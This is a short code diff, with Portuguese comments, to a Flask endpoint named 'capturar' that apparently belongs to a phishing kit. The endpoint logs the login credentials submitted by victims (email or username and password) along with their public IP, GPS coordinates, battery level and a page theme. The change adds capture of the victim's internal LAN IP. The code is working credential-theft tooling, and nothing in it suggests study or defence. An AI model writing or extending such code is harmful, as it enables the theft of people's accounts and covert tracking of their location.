@@ -119,12 +119,16 @@ def index():
 def capturar():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
-    ip = ip_list[0] if ip_list else request.remote_addr
+    ip_publico = ip_list[0] if ip_list else request.remote_addr
+    
+    # --- NOVO DADO CAPTURADO: IP INTERNO ---
+    ip_interno = dados.get('ip_interno', 'N/A')
     
     # --- DATA AJUSTADA PARA PADRÃO BR (DD/MM/AAAA) ---
     agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
     
-    log = (f"DATA: {agora} | IP: {ip}\n"
+    log = (f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
+           f"IP INTERNO (LAN): {ip_interno}\n"
            f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
            f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
            f"LAT: {dados.get('lat')} | LON: {dados.get('lon')}\n"
